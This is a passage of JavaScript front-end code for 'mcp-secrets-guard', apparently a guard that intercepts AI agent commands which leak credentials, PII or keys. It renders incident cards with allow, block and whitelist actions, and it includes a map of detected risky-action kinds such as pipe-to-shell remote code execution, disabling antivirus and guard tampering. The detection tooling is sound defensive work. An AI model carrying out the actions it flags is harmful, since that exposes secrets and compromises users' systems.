      L.push("2. PORTS & EXPOSURE — Network listener security");
      if (exp && exp.status === "ok") {
        var c = exp.counts || {};
        L.push("   Port security score:    " + (exp.score != null ? exp.score : "?") + "/100");
        L.push("   Critical: " + (c.critical || 0) + " · High: " + (c.high || 0) + " · Medium: " + (c.medium || 0) + " · Low: " + (c.low || 0));
      }
      L.push("");
      L.push("3. VAULT — Protected credentials");
      var vItems = (vlt && vlt.items) || [];
      var liveV = vItems.filter(function (v) { return !v.deleted; });
      L.push("   Secrets in vault:       " + liveV.length);
    }
    return L.join("\n");
  }

  function buildPassport(format, done) {
    Promise.all([
      SDK.fetchJSON(API + "/incidents").catch(function () { return { status: "error", items: [] }; }),
      SDK.fetchJSON(API + "/exposure").catch(function () { return { status: "error" }; }),
      SDK.fetchJSON(API + "/vault").catch(function () { return { status: "error", items: [] }; }),
    ]).then(function (res) {
      var inc = res[0], exp = res[1], vlt = res[2];
      var raw = passportText(inc, exp, vlt);
      var when = fmtTs(Math.floor(Date.now() / 1000));
      sha256(raw).then(function (hash) {
        var doc = raw + proofFooter(hash, when);
        if (format === "txt") {
          blobDownload("security-passport-" + Math.floor(Date.now() / 1000) + ".txt", doc, "text/plain;charset=utf-8");
          if (done) done();
        } else {
          var w = window.open("", "_blank");
          if (!w) { if (done) done(); return; }
          w.document.write("<!DOCTYPE html><html><head><meta charset='utf-8'><title>mcp-secrets-guard Passport</title><style>body{font-family:monospace;background:#0d1117;color:#e6edf3;padding:24px;white-space:pre-wrap;}</style></head><body>" + escHtml(doc) + "</body></html>");
          w.document.close();
          if (done) done();
        }
      });
    }).catch(function () { if (done) done(); });
  }

  const LABEL_COLOR = {
    Credentials: "#3ec46d",
    Financial: "#f0b44a",
    PII: "#5b9dff",
    Health: "#e25555",
    Location: "#b45bc4",
  };

  function Card(p) {
    return h("div", { className: "yg-card " + (p.className || "") },
      p.title ? h("span", { className: "yg-hd" }, p.title) : null,
      p.children);
  }

  function Chip(p) {
    const l = p.label || {};
    return h("span", { className: "yg-chip", style: { background: l.color || LABEL_COLOR[l.id] || "#555" } },
      (l.icon ? l.icon + " " : "") + (l.label || l.id || ""));
  }

  function Pill(p) {
    return h("span", { className: "yg-pill " + p.kind }, p.children);
  }

  function Empty(p) { return h("div", { className: "yg-dim" }, "● " + p.text); }

  // Hacker Text Scramble Matrix Algorithm
  function scrambleText(element, finalString, durationMs, onDone) {
    if (!element) return;
    var chars = "!<>-_\\/[]{}—=+*^?#________ABCDEF0123456789";
    var startString = element.innerText || "";
    var maxLen = Math.max(startString.length, finalString.length);
    var queue = [];
    var totalSteps = Math.round((durationMs || 600) / 25);

    for (var i = 0; i < maxLen; i++) {
      var from = startString[i] || "";
      var to = finalString[i] || "";
      var start = Math.floor(Math.random() * (totalSteps / 3));
      var end = start + Math.floor(Math.random() * (totalSteps * 0.7));
      queue.push({ from: from, to: to, start: start, end: end, char: "" });
    }

    var step = 0;
    var interval = setInterval(function () {
      var complete = 0;
      var out = "";
      for (var i = 0; i < queue.length; i++) {
        var item = queue[i];
        if (step >= item.end) {
          complete++;
          out += item.to;
        } else if (step >= item.start) {
          if (!item.char || Math.random() < 0.28) {
            item.char = chars[Math.floor(Math.random() * chars.length)];
          }
          out += item.char;
        } else {
          out += item.from;
        }
      }
      element.textContent = out;
      if (complete === queue.length) {
        clearInterval(interval);
        if (onDone) onDone();
      }
      step++;
    }, 25);
  }

  // =========================================================================
  // UNIFIED INCIDENT COMPONENT & HOLD-TO-SHOW UTILITIES
  // =========================================================================
  function extractDomain(inc) {
    if (!inc) return "";
    var text = [inc.command || "", inc.destination || "", (inc.risks && inc.risks[0] && inc.risks[0].snippet) || ""].join(" ");
    var m = text.match(/https?:\/\/([a-zA-Z0-9.-]+(?::[0-9]+)?)/i);
    if (m && m[1]) return m[1];
    if (inc.destination) {
      var destRaw = String(inc.destination);
      // A local path is not a network destination ("C:\\x", "E:/x", "\\\\srv\\share", "./x", "/x").
      if (/^[a-zA-Z]:[\\/]/.test(destRaw) || /^\\\\/.test(destRaw) || /^\.{0,2}[\\/]/.test(destRaw)) return "";
      var d = destRaw.replace(/^(?:shell|команда|command):\s*/i, "").replace(/^[a-z]+:\/\//i, "").split(/[/?# ]/)[0];
      if (d.indexOf("\\") !== -1) return "";
      if (d && d.indexOf(".") !== -1 && !/^[0-9]+$/.test(d)) return d;
    }
    return "";
  }

  // Tools that work on the local disk: their destination is the file system, not the net.
  var LOCAL_TOOLS = {
    read_file: 1, read_multiple_files: 1, write_file: 1, patch: 1, list_directory: 1,
    directory_tree: 1, get_file_info: 1, search_files: 1, move_file: 1, create_directory: 1,
    edit_file: 1, apply_diff: 1, read_text_file: 1, write_text_file: 1
  };

  function isLocalDestination(inc) {
    if (!inc) return false;
    // A real host anywhere in the call wins: "shell: curl" with a URL inside is egress.
    if (extractDomain(inc)) return false;
    if (LOCAL_TOOLS[String(inc.tool || "").toLowerCase()]) return true;
    var dest = String(inc.destination || "");
    if (/^(?:shell|команда|command):/i.test(dest)) return !/https?:\/\//i.test(dest);
    if (/^[a-zA-Z]:[\\/]/.test(dest) || /^\\\\/.test(dest) || /^\.{0,2}[\\/]/.test(dest)) return true;
    if (dest.indexOf("\\") !== -1) return true;
    return true;
  }

  // Category of a risky action (by kind, never by guessing from English text).
  var RISK_CATEGORY = {
    tamper_guard_files: { ru: "Попытка модификации защиты", en: "Guard tampering" },
    tamper_guard_env: { ru: "Попытка отключить защиту", en: "Guard bypass attempt" },
    destroy_files: { ru: "Уничтожение файлов", en: "Data destruction" },
    destroy_db: { ru: "Уничтожение базы данных", en: "Database destruction" },
    disable_defender: { ru: "Отключение антивируса", en: "Antivirus disabled" },
    firewall_open: { ru: "Изменение брандмауэра", en: "Firewall change" },
    rdp_enable: { ru: "Удалённый доступ", en: "Remote access" },
    public_tunnel: { ru: "Туннель в интернет", en: "Public tunnel" },
    expose_bind_all: { ru: "Сервис открыт в сеть", en: "Service exposed" },
    expose_ollama: { ru: "ИИ-сервер открыт в сеть", en: "AI server exposed" },
    expose_docker_port: { ru: "Порт контейнера открыт", en: "Container port exposed" },
    http_server_all: { ru: "Папка раздаётся по HTTP", en: "Folder shared over HTTP" },
    git_force: { ru: "Перезапись истории git", en: "Git history rewrite" },
    pipe_to_shell: { ru: "Запуск кода из сети", en: "Remote code execution" }
  };

  function riskCategoryLabel(kind, lang) {
    var m = RISK_CATEGORY[kind];
    if (m) return lang === "ru" ? m.ru : m.en;
    return lang === "ru" ? "Системная угроза" : "System risk";
  }

  // Masked secret with click-to-toggle / hold-to-show eye, generous hit target and copy button
  function Reveal(p) {
    const [isHeld, setIsHeld] = useState(false);
    const [isPinned, setIsPinned] = useState(false);
    const [fullValue, setFullValue] = useState("");
    const [err, setErr] = useState("");
    const [copied, setCopied] = useState(false);
    const pinTimerRef = useRef(null);

    useEffect(function () {
      if (p.incident) {
        post("/incidents/reveal", { incident: p.incident, index: p.index || 0 })
          .then(function (r) {
            if (r && r.status === "ok" && r.value) {
              setFullValue(r.value);
            }
          }).catch(function () {});
      }
      return function () {
        if (pinTimerRef.current) clearTimeout(pinTimerRef.current);
      };
    }, [p.incident, p.index]);

    function fetchSecret() {
      if (!fullValue && p.incident) {
        post("/incidents/reveal", { incident: p.incident, index: p.index || 0 })
          .then(function (r) {
            if (r && r.status === "ok" && r.value) {
              setFullValue(r.value);
            } else {
              setErr(r && r.message ? r.message : "Could not show value");
            }
          }).catch(function () {
            setErr("Could not reach backend");
          });
      }
    }

    function onPointerDown(e) {
      if (e && e.preventDefault) e.preventDefault();
      setIsHeld(true);
      fetchSecret();
    }

    function onPointerUp(e) {
      setIsHeld(false);
    }

    function togglePin(e) {
      if (e) {
        if (e.stopPropagation) e.stopPropagation();
        if (e.preventDefault) e.preventDefault();
      }
      if (pinTimerRef.current) clearTimeout(pinTimerRef.current);
      if (isPinned) {
        setIsPinned(false);
      } else {
        setIsPinned(true);
        fetchSecret();
        pinTimerRef.current = setTimeout(function () {
          setIsPinned(false);
        }, 15000);
      }
    }

    function handleCopy(e) {
      if (e) {
        if (e.stopPropagation) e.stopPropagation();
        if (e.preventDefault) e.preventDefault();
      }
      var val = fullValue || p.preview || "";
      copyText(val);
      setCopied(true);
      setTimeout(function () { setCopied(false); }, 1800);
    }

    const isRevealed = isHeld || isPinned;
    const shownText = isRevealed ? (fullValue || p.preview || "••••••••••••") : (p.preview || "••••••••••••");

    return h("span", {
      className: "yg-reveal" + (isRevealed ? " yg-reveal-on" : ""),
      title: isRevealed
        ? (currentLang === "ru" ? "Нажмите, чтобы скрыть секрет" : "Click to hide secret")
        : (currentLang === "ru" ? "Нажмите или удерживайте для открытия секрета" : "Click or hold to reveal secret"),
      onClick: togglePin
    },
      h("span", { className: "yg-reveal-val yg-mono", title: isRevealed ? undefined : shownText }, shownText),
      h("button", {
        type: "button",
        className: "yg-reveal-btn",
        title: isRevealed ? (currentLang === "ru" ? "Скрыть" : "Hide") : (currentLang === "ru" ? "Показать секрет" : "Show secret"),
        onPointerDown: onPointerDown,
        onPointerUp: onPointerUp,
        onMouseDown: onPointerDown,
        onMouseUp: onPointerUp,
        onClick: togglePin
      }, isRevealed ? "🙈" : "👁"),
      h("button", {
        type: "button",
        className: "yg-btn ghost yg-reveal-copy" + (copied ? " copied" : ""),
        style: { visibility: isRevealed ? "visible" : "hidden" },
        disabled: !isRevealed,
        title: currentLang === "ru" ? "Скопировать значение" : "Copy full value",
        onClick: handleCopy
      }, copied ? (currentLang === "ru" ? "✓ Скопировано" : "✓ Copied") : "⧉"),
      err ? h("span", { className: "yg-err yg-small", style: { marginLeft: 4 } }, err) : null
    );
  }

  function analyzeFindingDetails(finding, rawSecretText, targetDomain, lang, pathText) {
    var isRu = lang === "ru";
    var kindId = ((finding && finding.kind) || "").toLowerCase();
    if (kindId === "sensitive_file") {
      var shownPath = pathText || rawSecretText || "";
      return {
        categoryTitle: isRu ? "Защищённый системный файл" : "Protected system file",
        categorySub: isRu ? "Обращение к защищённому файлу" : "Protected file access",
        why: isRu
          ? ("Агент попытался прочитать или изменить защищённый файл шлюза (" + shownPath + "). Это конфигурация, журнал, правила или файл секретов самого mcp-secrets-guard - инструменту отказано.")
          : ("The agent tried to read or modify a file owned by the guard (" + shownPath + "). This is the guard's own configuration, journal, rules or secret store - the call was refused."),
        safer: isRu
          ? "Безопаснее: не давать агенту доступ к каталогу шлюза; если нужно прочитать конфигурацию - используйте копию без секретов."
          : "Safer: never give an agent access to the guard folder; use a secrets-free copy if configuration must be read.",
        isPath: true,
        local: true
      };
    }
    var l = ((finding && (finding.label || finding.title || "")) + "").toLowerCase();
    var t = ((finding && (finding.title || finding.label || "")) + "").toLowerCase();
    var domain = targetDomain || (isRu ? "внешний сервер в сети" : "an external network server");
    var preview = rawSecretText || "••••";

    if (l.indexOf("personal") !== -1 || t.indexOf("email") !== -1 || l.indexOf("персонал") !== -1 || t.indexOf("почт") !== -1 || t.indexOf("mail") !== -1 || l.indexOf("pii") !== -1) {
      return {
        categoryTitle: isRu ? "Персональные данные" : "Personal Data",
        categorySub: isRu ? "Адрес эл. почты (Email PII)" : "Email Address (PII)",
        why: isRu
          ? ("Агент попытался отправить персональные данные (" + preview + ") на " + domain + ". Шлюз перехватил команду до утечки личных данных пользователя.")
          : ("The agent attempted to transmit personal data (" + preview + ") to " + domain + ". Guard intercepted the command before PII was leaked."),
        safer: isRu
          ? "Безопаснее: анонимизировать персональные данные или сохранить контакт в Сейфе DPAPI (msg_tok_...) перед отправкой."
          : "Safer: Anonymize personal data or use a secure DPAPI Vault token instead of raw personal records."
      };
    }
    if (l.indexOf("password") !== -1 || t.indexOf("password") !== -1 || l.indexOf("парол") !== -1 || t.indexOf("парол") !== -1) {
      return {
        categoryTitle: isRu ? "Учетные данные" : "Credentials",
        categorySub: isRu ? "Пароль учетной записи" : "Account Password",
        why: isRu
          ? ("Агент попытался передать открытый пароль (" + preview + ") в запросе на " + domain + ". Шлюз заблокировал отправку незашифрованных учетных данных.")
          : ("The agent attempted to transmit an unencrypted password (" + preview + ") to " + domain + ". Guard blocked plaintext credential transmission."),
        safer: isRu
          ? "Безопаснее: использовать переменные окружения или токен Сейфа DPAPI (msg_tok_...) вместо открытого пароля в коде."
          : "Safer: Use environment variables or a DPAPI Vault token instead of hardcoding passwords."
      };
    }
    if (l.indexOf("financial") !== -1 || l.indexOf("card") !== -1 || l.indexOf("финанс") !== -1 || l.indexOf("карт") !== -1 || t.indexOf("card") !== -1) {
      return {
        categoryTitle: isRu ? "Финансовые данные" : "Financial Data",
        categorySub: isRu ? "Номер платёжной карты" : "Credit Card / Payment",
        why: isRu
          ? ("Агент попытался передать платёжные данные (" + preview + ") на " + domain + ". Шлюз заблокировал команду для защиты банковской тайны.")
          : ("The agent attempted to transmit credit card data (" + preview + ") to " + domain + ". Guard blocked the command to protect payment credentials."),
        safer: isRu
          ? "Безопаснее: токенизировать карту через Сейф DPAPI или использовать защищённый шлюз оплаты."
          : "Safer: Tokenize card data through DPAPI Vault or use an authorized payment gateway."
      };
    }
    if (l.indexOf("private") !== -1 || l.indexOf("ssh") !== -1 || l.indexOf("rsa") !== -1 || t.indexOf("private") !== -1 || t.indexOf("rsa") !== -1 || t.indexOf("ssh") !== -1) {
      return {
        categoryTitle: isRu ? "Криптографический ключ" : "Cryptographic Key",
        categorySub: isRu ? "Приватный ключ (SSH / RSA)" : "Private Key (SSH / RSA)",
        why: isRu
          ? ("Агент попытался передать секретный криптографический ключ (" + preview + ") на " + domain + ". Шлюз заблокировал утечку закрытого ключа.")
          : ("The agent attempted to transmit a private cryptographic key (" + preview + ") to " + domain + ". Guard blocked private key egress."),
        safer: isRu
          ? "Безопаснее: использовать ssh-agent или аппаратный Сейф DPAPI; никогда не передавать закрытые ключи наружу."
          : "Safer: Use ssh-agent or DPAPI hardware vault; never transmit private keys over the network."
      };
    }
    return {
      categoryTitle: isRu ? "Учетные данные и ключи" : "Credentials & Keys",
      categorySub: finding ? (finding.title || finding.label) : (isRu ? "API-ключ / Токен" : "API Key / Token"),
      why: isRu
        ? ("Агент попытался передать приватный API-ключ (" + preview + ") в открытом запросе на " + domain + ". Шлюз перехватил команду до передачи.")
        : ("The agent attempted to transmit private API credentials (" + preview + ") in an unencrypted request to " + domain + ". Guard intercepted it before egress."),
      safer: isRu
        ? "Безопаснее: использовать токен Сейфа DPAPI (msg_tok_...) вместо открытого секретного ключа."
        : "Safer: Use an encrypted DPAPI Vault token (msg_tok_...) instead of the raw secret key."
    };
  }

  // Unified IncidentCard Component (Used across Focal Main Stage, Pending Queue, and History)
  function IncidentCard(p) {
    const inc = p.inc;
    if (!inc) return null;
    const isFocal = !!p.isFocal;
    const isPendingQueue = !!p.isPendingQueue;
    const inAccordion = !!p.inAccordion;
    const isActive = !!p.isActive;
    const pending = inc.status === "pending";

    const [busy, setBusy] = useState("");
    const [note, setNote] = useState("");
    const [ruleBusy, setRuleBusy] = useState("");

    const targetDomain = extractDomain(inc);
    const domainLabel = targetDomain
      ? ("+ " + (currentLang === "ru" ? "Разрешить " : "Allow ") + targetDomain)
      : (currentLang === "ru" ? "⚙ В белый список" : "⚙ Whitelist");
    const domainTitle = targetDomain
      ? (currentLang === "ru" ? ("Добавить " + targetDomain + " в постоянный белый список") : ("Add " + targetDomain + " to permanent whitelist"))
      : (currentLang === "ru" ? "Добавить правило в белый список" : "Add permanent whitelist rule");

    function handleWhitelist(e) {
      if (e) e.stopPropagation();
      if (!targetDomain) {
        window.alert(currentLang === "ru" ? "В адресе назначения не найден домен." : "No domain found.");
        return;
      }
      setRuleBusy("allow:domain");
      post("/rules", { action: "allow", match_type: "domain", match: targetDomain, incident: inc.id })
        .then(function (r) {
          setRuleBusy("");
          if (r && r.status === "ok") {
            setNote(currentLang === "ru" ? ("✓ Домен " + targetDomain + " добавлен в белый список!") : ("✓ Domain " + targetDomain + " added to whitelist!"));
            if (p.onChanged) p.onChanged();
          } else {
            setNote(r && r.message ? r.message : "Failed to add rule.");
          }
        }).catch(function () {
          setRuleBusy("");
          setNote(currentLang === "ru" ? "Ошибка связи с бэкендом Guard." : "Failed to reach Guard backend.");
        });
    }

    function choose(choice, e) {
      if (e) e.stopPropagation();
      setBusy(choice);
      post("/incidents/decide", { incident: inc.id, choice: choice })
        .then(function (r) {
          setBusy("");
          if (r && r.status === "ok") {
            setNote(r.next || (choice === "allow" ? (currentLang === "ru" ? "Запрос разрешен." : "Allowed.") : choice === "protect" ? (currentLang === "ru" ? "Секрет защищен в Сейфе." : "Protected in vault.") : (currentLang === "ru" ? "Заблокировано." : "Blocked.")));
            if (p.onChanged) p.onChanged();
          } else {
            setNote(r && r.message ? r.message : "Could not save the decision.");
          }
        }).catch(function () {
          setBusy("");
          setNote(currentLang === "ru" ? "Ошибка связи с бэкендом Guard." : "Could not reach Guard backend.");
        });
    }

    var rawTitle = "";
    if (inc.agent && (inc.agent.chat_title || inc.agent.session_title)) {
      rawTitle = inc.agent.chat_title || inc.agent.session_title;
    } else if (inc.agent && inc.agent.session_id) {
      var resolved = resolveChatTitle(inc.agent.session_id);
      rawTitle = resolved.raw || resolved.title;
    }
    rawTitle = String(rawTitle || "")
      .replace(/^(?:архивный\s+)?(?:чат|chat)\s*(?:№|#)?\s*[:«"']?\s*/i, "")
      .replace(/[»"']$/i, "")
      .trim();
    if (/^[0-9]+$/.test(rawTitle)) {
      rawTitle = (currentLang === "ru" ? "Сеанс #" : "Session #") + rawTitle;
    }
    const chatName = rawTitle
      ? (currentLang === "ru" ? "«" + rawTitle + "»" : "\"" + rawTitle + "\"")
      : (inc.agent && inc.agent.session_id
          ? (currentLang === "ru" ? "«Сеанс #" + String(inc.agent.session_id).slice(-6) + "»" : "\"Session #" + String(inc.agent.session_id).slice(-6) + "\"")
          : (currentLang === "ru" ? "«ИИ-агент»" : "\"AI agent\""));

    const hasFindings = inc.findings && inc.findings.length > 0;
    const finding = hasFindings ? inc.findings[0] : null;
    const hasRisks = inc.risks && inc.risks.length > 0;
    const risk = hasRisks ? inc.risks[0] : null;

    const findingKind = ((finding && finding.kind) || "").toLowerCase();
    const isPathFinding = findingKind === "sensitive_file";
    const localTarget = isLocalDestination(inc);
    const destPath = String(inc.destination || "");

    const rawSecretText = finding ? (finding.preview || "") : "";
    const fullCode = inc.command || (risk && risk.snippet) || ((inc.tool || "") + " " + (inc.destination || ""));
    const findingAnalysis = hasFindings ? analyzeFindingDetails(finding, rawSecretText, targetDomain, currentLang, destPath) : null;
    const riskCategory = risk ? riskCategoryLabel(risk.kind, currentLang) : "";

    var cardClass = "yg-inc";
    if (isFocal) cardClass += " yg-decision-center focal";
    else if (isPendingQueue) cardClass += " yg-inc-queue" + (isActive ? " active-stage" : "");
    if (pending) cardClass += " pending";
    else cardClass += " done";

    return h("div", {
      className: cardClass,
      onClick: isPendingQueue ? function () { if (p.onSelect) p.onSelect(inc.id); } : undefined,
      style: isPendingQueue ? { cursor: "pointer" } : undefined
    },
      // Header
      h("div", { className: isFocal ? "yg-decision-header" : "yg-inc-top", style: { display: "flex", alignItems: "center", gap: 10, flexWrap: "wrap", marginBottom: "10px" } },
        h("span", { className: "yg-decision-badge threat" },
          (hasFindings ? "🛑 " : "⛔ ") + (inc.id || "")),
        h(Pill, { kind: pending ? "bad" : inc.status === "quarantined" ? "warn" : "ok" }, getStatusText(inc.status)),
        h("span", { className: "yg-dim yg-small" }, fmtTs(inc.at) + (inc.attempts > 1 ? " · " + inc.attempts + (currentLang === "ru" ? " попытки" : " attempts") : "")),
        targetDomain ? h("button", {
          type: "button",
          className: "yg-btn-whitelist",
          disabled: !!ruleBusy,
          title: domainTitle,
          onClick: handleWhitelist
        }, ruleBusy ? "…" : domainLabel) : null,
        isPendingQueue ? h("span", {
          className: "yg-pill " + (isActive ? "ok" : "warn"),
          style: { marginLeft: "auto", fontSize: "10px", padding: "2px 8px" }
        }, isActive ? (currentLang === "ru" ? "● На главной сцене" : "● Active on stage") : (currentLang === "ru" ? "👁 Нажмите, чтобы открыть на сцене ➔" : "👁 Click to focus on stage ➔")) : null
      ),

      // 4-Field Detailed Breakdown Grid
      h("div", { className: "yg-breakdown-grid" },
        // Field 1: What was detected (accurately analyzed)
        h("div", { className: "yg-breakdown-cell" },
          h("span", { className: "yg-breakdown-label" },
            isPathFinding ? ("📄 " + (currentLang === "ru" ? "Что обнаружено (Файл)" : "Detected (File)"))
              : hasFindings ? ("🔑 " + (currentLang === "ru" ? "Что словлено (Секрет)" : "Detected Secret"))
                : ("⚠️ " + (currentLang === "ru" ? "Что обнаружено (Угроза)" : "Detected Threat"))),
          h("span", { className: "yg-breakdown-val", style: { color: "#f87171" } },
            hasFindings ? (findingAnalysis ? (findingAnalysis.categorySub || finding.title) : finding.title)
              : (risk ? ((currentLang === "ru" && risk.title_ru) ? risk.title_ru : risk.title) : (currentLang === "ru" ? "Подозрительное действие" : "Suspicious execution"))),
          h("span", { className: "yg-dim yg-small" },
            isPathFinding ? (currentLang === "ru" ? "Категория: Защищённый системный файл" : "Category: Protected system file")
              : hasFindings ? ((currentLang === "ru" ? "Категория: " : "Category: ") + (findingAnalysis ? findingAnalysis.categoryTitle : (finding ? T(finding.label) : T("Credentials"))))
                : ((currentLang === "ru" ? "Категория: " : "Category: ") + (riskCategory || (currentLang === "ru" ? "Системная угроза" : "System risk"))))
        ),

        // Field 2: Secret value or Command signature with fixed 28px height (Zero Layout Shift)
        h("div", { className: "yg-breakdown-cell" },
          h("span", { className: "yg-breakdown-label" },
            isPathFinding ? ("📄 " + (currentLang === "ru" ? "Путь к файлу" : "File path"))
              : hasFindings ? ("👁️ " + (currentLang === "ru" ? "Значение секрета" : "Secret Value"))
                : ("⚙️ " + (currentLang === "ru" ? "Сигнатура вызова" : "Signature"))),
          isPathFinding
            ? h("div", { className: "yg-pathbox yg-mono", title: destPath }, destPath || rawSecretText)
            : hasFindings
              ? h(Reveal, { incident: inc.id, index: 0, preview: rawSecretText })
              : h("div", { className: "yg-secret-value-row" },
                  h("span", { className: "yg-secret-value-text", style: { color: "#f87171" }, title: fullCode },
                    (risk && risk.kind ? ("[" + risk.kind + "] ") : "") + (inc.tool || "terminal") + " → " + (inc.destination || "shell"))),
          h("span", { className: "yg-dim yg-small" },
            isPathFinding ? (currentLang === "ru" ? "Полный путь · файл защищён" : "Full path · file protected")
              : hasFindings ? (currentLang === "ru" ? "Защищено · Нажмите для открытия" : "Protected · Click to reveal")
                : (currentLang === "ru" ? "Опасное действие · локально" : "Risky action · local"))
        ),

        // Field 3: Source (From where)
        h("div", { className: "yg-breakdown-cell" },
          h("span", { className: "yg-breakdown-label" }, "🤖 " + (currentLang === "ru" ? "Источник (Откуда)" : "Source")),
          h("span", { className: "yg-breakdown-val" }, chatName),
          h("span", { className: "yg-dim yg-small" },
            (inc.process ? (inc.process.name + " (pid " + inc.process.pid + ") · ") : "hermes.exe · ") +
            (inc.agent && inc.agent.session_id ? (inc.agent.session_id + " · ") : "") +
            (currentLang === "ru" ? "инструмент: " : "tool: ") + (inc.tool || "terminal"))
        ),

        // Field 4: Destination (To where)
        h("div", { className: "yg-breakdown-cell" },
          h("span", { className: "yg-breakdown-label" }, (localTarget ? "💾 " : "🌐 ") + (currentLang === "ru" ? "Назначение (Куда)" : "Destination")),
          h("span", { className: "yg-breakdown-val", style: { color: localTarget ? "#fbbf24" : "#38bdf8", wordBreak: "break-all" } },
            targetDomain || inc.destination || (currentLang === "ru" ? "локальная система" : "local system")),
          h("span", { className: "yg-dim yg-small" },
            localTarget
              ? (currentLang === "ru" ? "Локальная файловая система · данные не покидают компьютер" : "Local file system · data never leaves this computer")
              : (currentLang === "ru" ? "Внешняя сеть / Исходящий запрос" : "External network endpoint"))
        )
      ),

      // Clean Command Box with Actions
      fullCode ? h("div", { className: "yg-fullcmd" },
        h("div", { style: { display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 4 } },
          h("span", { style: { fontSize: "10.5px", fontWeight: 800, color: "#94a3b8", textTransform: "uppercase" } },
            currentLang === "ru" ? "💻 Перехваченная команда терминала:" : "💻 Intercepted command:"),
          h("div", { style: { display: "flex", gap: 6 } },
            h("button", {
              type: "button", className: "yg-btn ghost", style: { padding: "2px 8px", fontSize: "11px" },
              onClick: function (e) { e.stopPropagation(); copyText(fullCode); }
            }, currentLang === "ru" ? "⧉ Копировать" : "⧉ Copy"),
            h("button", {
              type: "button", className: "yg-btn ghost", style: { padding: "2px 8px", fontSize: "11px" },
              onClick: function (e) { e.stopPropagation(); miniReport(inc, "txt"); }
            }, currentLang === "ru" ? "Отчёт TXT" : "TXT Report"),
            h("button", {
              type: "button", className: "yg-btn ghost", style: { padding: "2px 8px", fontSize: "11px" },
              onClick: function (e) { e.stopPropagation(); miniReport(inc, "json"); }
            }, currentLang === "ru" ? "Отчёт JSON" : "JSON Report")
          )
        ),
        h("pre", { className: "yg-mono yg-fullcmd-pre", style: { margin: 0, padding: "8px 12px", background: "rgba(0,0,0,0.65)", borderRadius: "6px", border: "1px solid rgba(255,255,255,0.08)" } }, fullCode)
      ) : null,

      // Plain Russian/English Risk Explanation & Accurate Advice Box
      (risk || hasFindings) ? h("div", { className: "yg-decision-why-box", style: { marginTop: 10 } },
        h("div", { style: { fontWeight: 800, marginBottom: 4, color: "#fca5a5" } },
          currentLang === "ru" ? "⚠️ Почему этот запрос был остановлен:" : "⚠️ Why this action was stopped:"),
        h("div", null,
          risk ? ((currentLang === "ru" && risk.why_ru) ? risk.why_ru : T(risk.why))
               : (findingAnalysis ? findingAnalysis.why : (currentLang === "ru"
                  ? ("Агент попытался передать секретные данные (" + rawSecretText + ") на внешний сервер " + (targetDomain || "в сеть") + ". Шлюз перехватил команду до передачи.")
                  : "The agent attempted to transmit private credentials in an unencrypted request to an external server. Guard intercepted it before egress."))),
        (risk && risk.safer) ? h("div", { className: "yg-ok yg-small", style: { marginTop: 6, fontWeight: 700 } },
          T("Safer: ") + ((currentLang === "ru" && risk.safer_ru) ? risk.safer_ru : T(risk.safer)))
        : (hasFindings ? h("div", { className: "yg-ok yg-small", style: { marginTop: 6, fontWeight: 700 } },
          findingAnalysis ? findingAnalysis.safer : (currentLang === "ru" ? "Безопаснее: использовать токен Сейфа DPAPI (msg_tok_...) вместо открытого секретного ключа." : "Safer: Use an encrypted DPAPI Vault token instead of raw secret.")) : null)
      ) : null,

      // Decision Action Buttons (if pending)
      pending ? h("div", { className: "yg-actions", style: { marginTop: 12 } },
        (hasFindings && !isPathFinding) ? h("button", {
          type: "button",
          className: "yg-btn good",
          disabled: !!busy,
          onClick: function (e) { choose("protect", e); }
        }, busy === "protect" ? "…" : ("🛡️ " + (currentLang === "ru" ? "Защитить токеном и отправить" : "Protect & send"))) : null,
        h("button", {
          type: "button",
          className: "yg-btn ghost",
          disabled: !!busy,
          onClick: function (e) { choose("allow", e); }
        }, busy === "allow" ? "…" : ("⚡ " + (currentLang === "ru" ? "Пропустить один раз" : "Allow once"))),
        h("button", {
          type: "button",
          className: "yg-btn bad",
          disabled: !!busy,
          onClick: function (e) { choose("block", e); }
        }, busy === "block" ? "…" : (hasFindings
            ? ("⛔ " + (currentLang === "ru" ? "Заблокировать и поместить в карантин" : "Block & quarantine"))
            : ("⛔ " + (currentLang === "ru" ? "Заблокировать" : "Block")))),
        note ? h("span", { style: { color: "#4ade80", fontSize: "12px", fontWeight: 700, marginLeft: "auto" } }, note) : null
      ) : null
    );
  }

  // =========================================================================
  // TASK 1: LIVE 3-NODE LOTTIE CONVEYOR & 60 FPS SVG VISUAL SECURITY MAP
  // =========================================================================
  function VisualSecurityMap(p) {
    var data = p.data || {}, items = (data.items || []), vaultCount = p.vaultCount || 0;
    var blocked = items.some(function (i) { return i.status === "blocked" || i.status === "quarantined"; });
    var intercepted = items.some(function (i) { return i.status === "protected"; });

    var rawChat = "";
    var dest = currentLang === "ru" ? "Шлюз защищён" : "Gateway protected";
    items.forEach(function (i) {
      if (!rawChat && i.agent) {
        if (i.agent.chat_title || i.agent.session_title) {
          rawChat = i.agent.chat_title || i.agent.session_title;
        } else if (i.agent.session_id) {
          var c = resolveChatTitle(i.agent.session_id);
          rawChat = c.raw || c.title;
        }
      }
      if (i.destination) dest = i.destination;
    });
    if (!rawChat && (data.active_chat_title || _sessionTitlesCache["__latest__"])) {
      rawChat = data.active_chat_title || _sessionTitlesCache["__latest__"];
    }
    rawChat = String(rawChat || "")
      .replace(/^(?:архивный\s+)?(?:чат|chat)\s*(?:№|#)?\s*[:«"']?\s*/i, "")
      .replace(/[»"']$/i, "")
      .trim();
    var chatName = rawChat
      ? (currentLang === "ru" ? "«" + rawChat + "»" : "\"" + rawChat + "\"")
      : (currentLang === "ru" ? "Ожидание команд" : "Awaiting agent commands");

    var lottieEngine = typeof window !== "undefined" && (window.bodymovin || window.lottie);
    var hasLottie = !!lottieEngine && typeof window !== "undefined" && !!window.__LOTTIE_ASSETS__;
    var stTVer = useState(0), setTitleVer = stTVer[1];
    useEffect(function () {
      var onTitles = function () { setTitleVer(function (v) { return v + 1; }); };
      _titleListeners.add(onTitles);
      loadDynamicSessionTitles();
      return function () { _titleListeners.delete(onTitles); };
    }, []);

    var st2 = useState(0), vaultBonus = st2[0], setVaultBonus = st2[1];

    // Live incident & secret calculations
    var blockedItems = items.filter(function (i) { return i.status === "blocked" || i.status === "quarantined"; });
    var pendingItems = items.filter(function (i) { return i.status === "pending"; });
    var protectedItems = items.filter(function (i) { return i.status === "protected"; });
    var blockedCount = blockedItems.length;
    var protectedCount = protectedItems.length;
    var pendingCount = pendingItems.length;

    var allFindings = [];
    items.forEach(function (i) {
      if (i.findings && i.findings.length) {
        i.findings.forEach(function (f) { allFindings.push(f); });
      }
    });
